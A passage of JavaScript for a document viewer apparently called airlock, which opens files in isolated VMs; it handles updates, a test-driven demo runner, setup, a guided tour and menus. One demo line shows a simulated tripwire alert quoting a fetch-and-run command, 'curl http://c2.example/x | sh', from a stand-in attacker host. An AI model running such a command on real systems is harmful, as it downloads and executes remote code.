// quiet: started automatically — no panel, a notice when done.
async function runUpdate(body, quiet = false) {
  if (updates.running) return;
  hideToast();
  if (!updates.status) await checkUpdates(false).catch(() => {});
  updates.running = true;
  updates.restart = false;
  updates.log = ["Starting…"];
  if (!quiet) {
    if (!body || $("panel-title").textContent !== "Updates") body = openPanel("Updates");
    renderUpdates(body);
  }
  status("Updating airlock's VM in the background…");
  let ok = false;
  try {
    const r = await invoke("run_update");
    // The script's summary minus its command-line hints.
    for (const l of r.lines) {
      const t = l.trim();
      if (t && !t.startsWith("==>") && !t.startsWith("undo:")) updates.log.push(t);
    }
    updates.log.push(r.ok ? "Done — all checks passed." : "The update failed its checks; the previous version is still in place.");
    updates.restart = r.ok && r.restart;
    ok = r.ok;
    status(r.ok ? "airlock updated" : "Update failed — nothing was changed", !r.ok);
    try { await checkUpdates(true); } catch {}
  } catch (e) {
    updates.log.push(`Update failed: ${e}`);
    status(`Update failed: ${e}`, true);
  } finally {
    updates.running = false;
    if ($("panel-title").textContent === "Updates" && !$("panel").hidden) renderUpdates($("panel-body"));
  }
  if (quiet) {
    if (ok) notify("airlock was updated", "Security updates were installed and all checks passed. Documents you open now use the updated VM.", [
      ...(updates.restart ? [["Restart airlock", () => invoke("restart_app")]] : []),
      ["Details", showUpdates], ["OK", hideToast]]);
    else notify("Automatic update failed", "Nothing was changed: airlock keeps using the current version. Details are in the Updates panel.", [["Details", showUpdates], ["OK", hideToast]]);
  }
}

window.__TAURI__.event.listen("update-progress", (e) => {
  const line = String(e.payload);
  // Steps only ("==> Rebuilding…"); the full log is in build/update.log.
  if (!line.startsWith("==>")) return;
  updates.log.push(line.slice(4));
  if ($("panel-title").textContent === "Updates" && !$("panel").hidden) renderUpdates($("panel-body"));
});

$("updates").onclick = showUpdates;

async function autoCheckUpdates() {
  if (pref("airlock.autoUpdateCheck", "1") !== "1") return;
  // Test runs (a demo script drives the app) never start updates.
  if (await invoke("demo_script").catch(() => null)) return;
  try {
    const st = await checkUpdates(false);
    if (!st.available) return;
    if (pref("airlock.autoInstall", "1") === "1") {
      notify("Installing security updates", `${changeSummary(st)}. airlock is updating in the background; you can keep reading.`, [["Details", showUpdates], ["Hide", hideToast]]);
      runUpdate(null, true);
    } else if (Date.now() > Number(pref("airlock.updateSnooze", "0"))) showToast(st);
  } catch {}
}
setTimeout(autoCheckUpdates, 3000);

async function runDemo() {
  const script = await invoke("demo_script");
  if (!script) return;
  for (const step of script.split(";")) {
    const [cmd, arg] = step.split("=");
    if (cmd === "search") { $("q").value = arg; await runSearch(); }
    if (cmd === "open") openPaths([arg]);
    if (cmd === "reopen") await reopenDocument();
    if (cmd === "appmenu") toggleAppMenu(true);
    if (cmd === "ctx") {
      const [x, y] = arg.split(",").map(Number);
      document.elementFromPoint(x, y).dispatchEvent(new MouseEvent("contextmenu", { bubbles: true, cancelable: true, clientX: x, clientY: y }));
    }
    if (cmd === "click") $(arg).click();
    if (cmd === "tripwire") vmStopped("the document attacked its VM: /bin/sh [/bin/sh -c curl http://c2.example/x | sh] (blocked; the VM was destroyed at once)");
    if (cmd === "sheets") { setPref("airlock.sheetSingle", arg === "single" ? "1" : "0"); showSheetLayout(); await invoke("set_sheet_layout", { single: arg === "single" }); await reopenDocument(); }
    if (cmd === "tour") { startTour(); tourShow(Number(arg) || 0); }
    if (cmd === "wait") await new Promise((r) => setTimeout(r, Number(arg) || 0));
    if (cmd === "text") await showText();
    if (cmd === "aitext") { setPref("airlock.aiHints", "1"); await showText(); await new Promise((r) => setTimeout(r, Number(arg) || 3000)); }
    if (cmd === "reveal") {
      // Paint the invisible text layer red to check its alignment.
      await new Promise((r) => setTimeout(r, 1500));
      for (const span of document.querySelectorAll(".page .text span")) span.style.color = "rgba(220, 0, 0, 0.75)";
    }
    if (cmd === "select") {
      // Select page 1's text layer and show what a copy would contain.
      await new Promise((r) => setTimeout(r, 1500));
      const r = document.createRange();
      r.selectNodeContents(state.pages[0].text);
      getSelection().removeAllRanges();
      getSelection().addRange(r);
      const body = openPanel("Selection (demo)");
      body.replaceChildren(el("pre", "", JSON.stringify(getSelection().toString()).slice(0, 2000)));
    }
    if (cmd === "analyze") await analyze();
    if (cmd === "savemenu") toggleSaveMenu(true);
    if (cmd === "print") await printDocument();
    if (cmd === "safecopy") await saveSafeCopy();
    if (cmd === "savereport") await saveReport();
    if (cmd === "update") await runUpdate();
    if (cmd === "restart") { await new Promise((r) => setTimeout(r, Number(arg) || 0)); await invoke("restart_app"); }
    if (cmd === "updates") { await checkUpdates(arg === "force"); showUpdates(); }
    if (cmd === "autotoast") notify("airlock was updated", "Security updates were installed and all checks passed. Documents you open now use the updated VM.", [["Restart airlock", () => {}], ["Details", showUpdates], ["OK", hideToast]]);
    if (cmd === "toast") showToast({ changes: ["mupdf-tools 1.27.2-r0 → 1.27.3-r0", "Guest kernel 6.1.190 → 6.1.191"], packages: 14 });
  }
}

// Pixels-only preference: the environment (AIRLOCK_PIXELS_ONLY) or the last choice.
// Spreadsheet layout: "One page" per sheet, or pages fitted to the width.
// Converting happens in the VM, so switching reopens the document there.
function sheetSingle() { return pref("airlock.sheetSingle", "0") === "1"; }
function showSheetLayout() {
  const on = sheetSingle();
  $("sheetbtn").setAttribute("aria-pressed", String(on));
  $("sheetbtn").title = on
    ? "Showing each sheet as one continuous page. Click to split sheets into pages that fit the width."
    : "Showing sheets split into pages that fit the width. Click to show each sheet as one continuous page (very large sheets stay split, to remain sharp).";
}
$("sheetbtn").onclick = async () => {
  setPref("airlock.sheetSingle", sheetSingle() ? "0" : "1");
  showSheetLayout();
  await invoke("set_sheet_layout", { single: sheetSingle() });
  await reopenDocument();
};
const sheetsReady = invoke("set_sheet_layout", { single: sheetSingle() }).then(showSheetLayout);

const pixelsReady = invoke("pixels_only").then(async (on) => {
  let saved = null;
  try { saved = localStorage.getItem("airlock.pixelsOnly"); } catch {}
  // Only the user's own toggling is remembered, not the environment's default.
  await setPixelsOnly(on || saved === "1", false);
  status("Ready");
});

// ---------------------------------------------------------------- first-run setup
// Shown instead of the start page when this computer still needs something
// (scripts/setup.sh check). On a ready computer it never appears.
const setup = { items: [] };
async function checkSetup() {
  let items = [];
  try { items = await invoke("setup_check"); } catch (e) { status(`Could not check this computer: ${e}`, true); }
  setup.items = items;
  const pending = items.filter((i) => i.status !== "ok");
  $("setup").hidden = !pending.length;
  if (!state.docOpen) $("empty").hidden = !!pending.length;
  if (!pending.length) return true;
  const marks = { ok: "✓", fix: "!", build: "↓", fail: "✕" };
  $("setup-list").replaceChildren(...items.map((i) => {
    const li = el("li", i.status);
    li.append(el("span", "mark", marks[i.status] || "?"), el("span", "", i.text));
    return li;
  }));
  const fixable = items.some((i) => i.status === "fix");
  $("setup-fix").hidden = !fixable;
  $("setup-build").hidden = fixable || !items.some((i) => i.status === "build") || items.some((i) => i.status === "fail");
  return false;
}
$("setup-recheck").onclick = checkSetup;
$("setup-fix").onclick = async () => {
  const b = $("setup-fix");
  b.disabled = true;
  status("Waiting for your password…");
  try { await invoke("setup_fix"); status("System settings done"); }
  catch (e) { status(String(e), true); }
  b.disabled = false;
  checkSetup();
};
$("setup-build").onclick = async () => {
  const b = $("setup-build"), log = $("setup-log");
  b.disabled = true;
  log.hidden = false;
  log.textContent = "";
  status("Building the secure viewer (10-20 minutes; you can leave this open)…");
  const off = await window.__TAURI__.event.listen("setup-progress", (ev) => {
    log.textContent = (log.textContent + ev.payload + "\n").split("\n").slice(-200).join("\n");
    log.scrollTop = log.scrollHeight;
  });
  try { await invoke("setup_build"); status("airlock is ready"); }
  catch (e) { status(String(e), true); }
  off();
  b.disabled = false;
  checkSetup();
};
const setupReady = checkSetup();

invoke("initial_path").then(async (p) => {
  await pixelsReady;
  await sheetsReady;
  // Not set up yet: the setup screen stays; the file waits for the next start.
  if (!(await setupReady) && p) { status("Set up airlock first, then open the file again", true); return; }
  if (!p) return runDemo();
  await openWith(invoke("open_path", { path: p }), p.split(/[\\/]/).pop());
  runDemo();
});

// ---------------------------------------------------------------- guided tour
// A spotlight glides over each control while a glass card explains what it
// does and how it works. Runs once on first start; the ? button replays it.

const TOUR = [
  { target: null, kicker: "Welcome", title: "Open anything. Risk nothing.",
    text: "airlock opens every PDF and Office file inside its own throwaway virtual machine, a tiny separate computer with no network.",
    how: "Your computer never reads the file itself. It only receives pictures of the pages and cleaned-up text. Close the document and the whole VM is destroyed." },
  { target: "open", kicker: "Open", title: "Open a document",
    text: "Pick files here, press Ctrl+O, or drag them onto the window.",
    how: "Each document gets a brand-new VM that boots in about a second. Open several at once and each gets its own window and VM, so documents never share anything." },
  { target: "seal", kicker: "Status", title: "The seal",
    text: "Green means the document is sealed in its VM, with no network card at all.",
    how: "If the VM ever stops, the seal turns grey and airlock offers to reopen the document in a fresh one." },
  { target: "searchbox", kicker: "Find", title: "Search inside the VM",
    text: "Type to find words. Enter and Shift+Enter jump between matches.",
    how: "The search runs inside the VM. Only the positions of the matches come back as numbers, and airlock draws the highlights itself." },
  { target: "zoombox", kicker: "View", title: "Zoom",
    text: "Zoom in and out, or Fit to match the window width. The + and − keys work too.",
    how: "The VM redraws each page sharply at the new size: no blurry scaling." },
  { target: "textbtn", kicker: "Read", title: "Page text",
    text: "Shows the text of the current page. You can also select and copy text straight from the page.",
    how: "The text is strictly cleaned before it leaves the VM: only normal visible characters, nothing hidden or invisible." },
  { target: "savewrap", kicker: "Keep", title: "Save a safe copy, or print",
    text: "Safe PDF copy (Ctrl+S) writes a new PDF made only of the page pictures. Print (Ctrl+P) prints them.",
    how: "Nothing from the original survives in the copy (no scripts, links, fonts or attachments), so it is safe to keep, share or open anywhere." },
  { target: "pixels", kicker: "Lock down", title: "Pixels only",
    text: "For files you really distrust: no text leaves the VM at all, only pictures.",
    how: "Text selection and the Text panel turn off. Search still works, because it only needs positions." },
  { target: "updates", kicker: "Stay patched", title: "Updates",
    text: "Keeps the VM's document readers, kernel and malware signatures current. It checks daily and installs automatically.",
    how: "Every update is checked against official signatures and must pass airlock's full test suite before it is used. If anything fails, the old version stays." },
  { target: "analyze", kicker: "Investigate", title: "Analyze",
    text: "Finds out what a file tries to do: contact servers, run programs, drop files, exploit the reader. Every file you open is checked automatically; the badge next to Sealed shows the result (turn it off in the airlock logo menu).",
    how: "It runs the file in a second VM wired to a fake internet, then inspects that VM's disk from a third one. The report explains every finding in plain words, with the technical evidence underneath." },
  { target: "tourbtn", kicker: "That's it", title: "You're ready",
    text: "Replay this tour anytime with the ? button. Right-click anywhere (or click the airlock logo) for a new window, Close this window (Ctrl+W) or Exit airlock, which closes every document (Ctrl+Q). The same is in the tray icon and in the launcher's right-click menu.",
    how: "Tip: when a file looks suspicious, press Analyze before you trust it." },
];

const tour = { i: 0, revealed: [], onKey: null };

function tourPlace() {
  const step = TOUR[tour.i];
  const spot = $("tour-spot"), card = $("tour-card");
  const target = step.target && $(step.target);
  const r = target && !target.hidden ? target.getBoundingClientRect() : null;
  const vw = window.innerWidth, vh = window.innerHeight;
  if (r && r.width) {
    const pad = 6;
    Object.assign(spot.style, { left: `${r.left - pad}px`, top: `${r.top - pad}px`, width: `${r.width + pad * 2}px`, height: `${r.height + pad * 2}px` });
    spot.classList.remove("center");
  } else {
    Object.assign(spot.style, { left: `${vw / 2}px`, top: `${vh / 2}px`, width: "0px", height: "0px" });
    spot.classList.add("center");
  }
  // The card sits below the target (or above it if there is no room), kept on screen.
  const cw = Math.min(380, vw - 32), ch = card.offsetHeight || 260;
  let left, top;
  if (r && r.width) {
    left = Math.min(Math.max(16, r.left + r.width / 2 - cw / 2), vw - cw - 16);
    top = r.bottom + 18 + ch < vh ? r.bottom + 18 : Math.max(16, r.top - ch - 18);
  } else {
    left = (vw - cw) / 2;
    top = Math.max(16, (vh - ch) / 2);
  }
  Object.assign(card.style, { left: `${left}px`, top: `${top}px`, width: `${cw}px` });
}

function tourShow(i) {
  tour.i = Math.max(0, Math.min(TOUR.length - 1, i));
  const step = TOUR[tour.i];
  const card = $("tour-card");
  card.classList.remove("enter");
  void card.offsetWidth; // restart the entrance animation
  card.classList.add("enter");
  $("tour-step").textContent = `${String(tour.i + 1).padStart(2, "0")} / ${String(TOUR.length).padStart(2, "0")}`;
  $("tour-fill").style.width = `${((tour.i + 1) / TOUR.length) * 100}%`;
  $("tour-kicker").textContent = step.kicker;
  $("tour-title").textContent = step.title;
  $("tour-text").textContent = step.text;
  $("tour-how").textContent = step.how;
  $("tour-back").disabled = tour.i === 0;
  $("tour-next").textContent = tour.i === TOUR.length - 1 ? "Start using airlock" : "Next";
  tourPlace();
  // Placement uses the card's height, which the new text may have changed.
  requestAnimationFrame(tourPlace);
}

function startTour() {
  closePanel();
  toggleSaveMenu(false);
  // Show the whole toolbar, as it looks with a document open; put it back afterwards.
  tour.revealed = ["doc", "searchbox", "zoombox", "textbtn", "savewrap", "pixels", "analyze"].filter((id) => $(id).hidden);
  for (const id of tour.revealed) $(id).hidden = false;
  if (!$("docname").textContent) { $("docname").textContent = "your-document.pdf"; tour.placeholder = true; }
  document.body.classList.add("touring");
  $("tour").hidden = false;
  requestAnimationFrame(() => $("tour").classList.add("on"));
  tourShow(0);
  tour.onKey = (e) => {
    if (e.key === "ArrowRight" || e.key === "Enter") { e.preventDefault(); tour.i === TOUR.length - 1 ? endTour() : tourShow(tour.i + 1); }
    else if (e.key === "ArrowLeft") { e.preventDefault(); tourShow(tour.i - 1); }
    else if (e.key === "Escape") { e.preventDefault(); endTour(); }
    e.stopImmediatePropagation();
  };
  document.addEventListener("keydown", tour.onKey, true);
  window.addEventListener("resize", tourPlace);
}

function endTour() {
  try { localStorage.setItem("airlock.tourDone", "1"); } catch {}
  document.removeEventListener("keydown", tour.onKey, true);
  window.removeEventListener("resize", tourPlace);
  $("tour").classList.remove("on");
  document.body.classList.remove("touring");
  setTimeout(() => { $("tour").hidden = true; }, 350);
  for (const id of tour.revealed) $(id).hidden = true;
  if (tour.placeholder) { $("docname").textContent = ""; tour.placeholder = false; }
  if (state.docOpen) fitWidth();
}

$("tourbtn").onclick = startTour;

// ---------------------------------------------------------------- app menu
// Works on every desktop (with or without a tray): new window, tour, exit.
function toggleAppMenu(open) {
  const m = $("appmenu");
  m.hidden = open === undefined ? !m.hidden : !open;
  $("appbtn").setAttribute("aria-expanded", String(!m.hidden));
}
function quitEverything() {
  status("Closing every airlock window and its VM…");
  invoke("quit_everything");
}
$("appbtn").onclick = (e) => { e.stopPropagation(); toggleAppMenu(); };
$("m-new").onclick = () => { toggleAppMenu(false); invoke("new_window"); };
$("m-tour").onclick = () => { toggleAppMenu(false); startTour(); };
$("m-quit").onclick = quitEverything;
$("m-close").onclick = closeWindow;
function showAutoCheck() { $("m-auto").setAttribute("aria-checked", String(autoCheckOn())); }
$("m-auto").onclick = () => {
  setPref("airlock.autoCheck", autoCheckOn() ? "0" : "1");
  showAutoCheck();
  if (autoCheckOn() && state.docOpen && !check.report && !check.running) startCheck();
  status(autoCheckOn() ? "Files are checked for malware automatically when opened" : "Automatic check off: press Analyze to check a file");
};
showAutoCheck();
function closeWindow() {
  status("Closing this window and its VM…");
  invoke("close_window");
}

// Right-click: airlock's own menu instead of WebKit's (whose Reload would
// throw away the open document). Text boxes keep the native one (paste).
function hideCtx() { $("ctxmenu").hidden = true; }
document.addEventListener("contextmenu", (e) => {
  if (e.target.closest("input, textarea")) return;
  e.preventDefault();
  toggleAppMenu(false);
  const m = $("ctxmenu");
  m.querySelectorAll("[data-doc]").forEach((b) => (b.hidden = !state.docOpen));
  $("c-copy").hidden = !String(getSelection() || "").trim();
  m.hidden = false;
  const x = Math.min(e.clientX, innerWidth - m.offsetWidth - 4), y = Math.min(e.clientY, innerHeight - m.offsetHeight - 4);
  m.style.left = Math.max(4, x) + "px";
  m.style.top = Math.max(4, y) + "px";
});
const ctxActions = {
  "c-copy": () => document.execCommand("copy"),
  "c-zin": () => stepZoom(1),
  "c-zout": () => stepZoom(-1),
  "c-fit": fitWidth,
  "c-safe": saveSafeCopy,
  "c-print": printDocument,
  "c-analyze": () => analyze(),
  "c-new": () => invoke("new_window"),
  "c-close": closeWindow,
  "c-quit": quitEverything,
};
for (const [id, fn] of Object.entries(ctxActions)) $(id).onclick = () => { hideCtx(); fn(); };
document.addEventListener("click", (e) => { if (!$("ctxmenu").contains(e.target)) hideCtx(); });
window.addEventListener("blur", hideCtx);
window.addEventListener("scroll", hideCtx, true);
document.addEventListener("click", (e) => { if (!$("appwrap").contains(e.target)) toggleAppMenu(false); });
document.addEventListener("keydown", (e) => {
  if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === "q") { e.preventDefault(); quitEverything(); }
  if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === "w") { e.preventDefault(); closeWindow(); }
  if (e.key === "Escape") { toggleAppMenu(false); hideCtx(); }
});
$("tour-next").onclick = () => (tour.i === TOUR.length - 1 ? endTour() : tourShow(tour.i + 1));
$("tour-back").onclick = () => tourShow(tour.i - 1);
$("tour-skip").onclick = endTour;

// First start: the tour, unless a test script is driving the app.
(async () => {
  let done = false;
  try { done = localStorage.getItem("airlock.tourDone") === "1"; } catch {}
  const demo = await invoke("demo_script").catch(() => null);
  if (!done && !demo) setTimeout(startTour, 700);
})();
